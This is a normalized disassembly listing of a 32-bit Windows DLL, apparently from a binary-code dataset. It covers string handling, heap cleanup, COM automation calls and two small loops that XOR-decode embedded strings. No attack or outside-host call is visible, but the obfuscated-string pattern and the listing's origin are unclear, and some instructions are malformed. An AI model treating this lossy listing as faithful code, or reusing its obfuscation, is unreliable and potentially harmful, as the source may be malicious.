mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1001e620
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push esi
push edi
mov esi ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
sub eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
lea ebx [ eax + edi ]
push 0x0
push ebx
mov ecx esi
call sub_1002a5ec
test al al
je r-xdata
pop ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_1001e6d0
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_1001e70b
push 0x8
mov eax sub_10080031
call sub_100097c8
xor ebx ebx
push ebx
push ebx
mov [ ebp - 0x10 ] ebx
call sub_10022e30
mov edi [ ebp + 0x14 ]
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_10058063
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1006a03c
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x8
call sub_10055606
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_100096df
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1003ec82
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_100599a6
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
call sub_1004db01
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1002cb20
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x1c
call sub_10055606
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x12
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_10059c54
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10022524
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x14
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_1005442b
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10011620
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xd
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1002141a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0xe
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_10059c54
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
sub_1001eab8
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_1006bc7c
mov ecx [ ebp + 0x1c ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_100177a8
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_100177a8
add esp 0x10
test eax eax
js r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_100796a0
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov ebx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_1001ebe0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x38 ] dx
lea edx [ ebp - 0x10 ]
mov eax 0x6d
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x30 ] 0x1
call sub_100050e0
mov ebx [ ebp - 0x38 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x30 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x2c ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
push edx
mov edx [ ebp - 0x20 ]
mov ecx edi
xor ebx ebx
call sub_1001f320
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ ebp - 0x14 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov ebx 0x3
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
je r-xdata
lea ebx [ edi + 0x6 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x18 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
push eax
call sub_1005eea0
mov ecx [ ebp - 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov ebx 0x4
jmp r-xdata
sub_1001ed50
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_1001ed84
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10079abd
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10039c8c
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1001ee80
push ebp
mov ebp esp
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd0 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xcc ] eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x6c
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x4c ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xc8 ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xc8 ]
jns r-xdata
lea edx [ ebp - 0xc0 ]
mov [ ebp - 0xc0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x36
call sub_100050e0
mov esi [ ebx + 0xc ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10022870
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x55
call sub_100050e0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x105
call sub_100050e0
mov esi [ ebx + 0x4 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
push edi
call sub_10022870
test eax eax
je r-xdata
call sub_100050e0
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
lea edx [ ebp - 0x14 ]
mov eax 0x11f
call sub_100050e0
mov esi [ ebx + 0x8 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xa5
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xe4
call sub_100050e0
mov esi [ ebx + 0x10 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10022870
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x12c
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xc4 ] eax
lea eax [ ebp - 0xc4 ]
push eax
push 0x0
push 0x80000000
push ecx
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x117
call sub_100050e0
mov esi [ ebp - 0xc4 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc4 ] eax
mov ecx [ ebp - 0xc4 ]
push ecx
call [ SysFreeString@IAT ]
mov edx [ ebp - 0xd0 ]
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0xcc ]
push edx
mov edx [ ebp - 0xc8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xcc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0xeb
call sub_100050e0
lea edx [ ebp - 0xbc ]
mov eax 0x8c
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xcc ] 0x0
jmp r-xdata
sub_1001f136
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1001f1c0
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10030ef2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1002c25c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1001f26e
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_1005bb8e
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000599d
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_1001f320
push ebp
mov ebp esp
sub esp 0x1f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx 0x3
mov [ ebp - 0x1f8 ] eax
xor eax eax
mov ebx edx
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1d0 ] ebx
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1f4 ] eax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffe0
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0x1e8 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0x1e8 ]
jns r-xdata
lea edx [ ebp - 0x1c4 ]
mov [ ebp - 0x1c4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x5a
call sub_100050e0
mov esi [ ebx ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0x11e
call sub_100050e0
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x1f0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1f0 ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x1ac ]
mov eax 0x69
call sub_100050e0
mov esi [ ebp - 0x1f0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xc6
jmp r-xdata
call sub_100050e0
mov edx [ ebp - 0x1f0 ]
push edx
call [ SysFreeString@IAT ]
mov ecx [ ebx + 0x20 ]
lea eax [ ebp - 0x1ec ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1ec ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x120 ]
mov eax 0x1
call sub_100050e0
mov esi [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
mov ecx [ ebp - 0x1f0 ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1e8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1c4 ] 0x0
mov edx [ ebp - 0x1ec ]
push edx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0xd0 ]
mov eax 0x65
call sub_100050e0
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10022870
test eax eax
je r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x8b
call sub_100050e0
mov esi [ ebx + 0xc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x6e
jmp r-xdata
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x1cc ] ecx
call sub_10015a30
mov ebx eax
lea ecx [ ebx + ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x1cc ]
mov esi eax
mov edi esi
call sub_10038ef0
lea edx [ ebp - 0xbc ]
mov eax 0x58
call sub_100050e0
mov edi [ ebp - 0x1c8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xfe
call sub_100050e0
test esi esi
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x6
call sub_100050e0
lea edx [ ebp - 0xe4 ]
mov eax 0x125
call sub_100050e0
mov ebx [ ebp - 0x1d0 ]
mov esi [ ebx + 0x14 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10022870
test eax eax
je r-xdata
push esi
call [ LocalFree@IAT ]
lea edx [ ebp - 0x90 ]
mov eax 0x7
call sub_100050e0
mov esi [ ebx + 0x18 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xa7
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xf6
call sub_100050e0
mov esi [ ebx + 0x1c ]
push edx
lea eax [ ebp - 0x1c4 ]
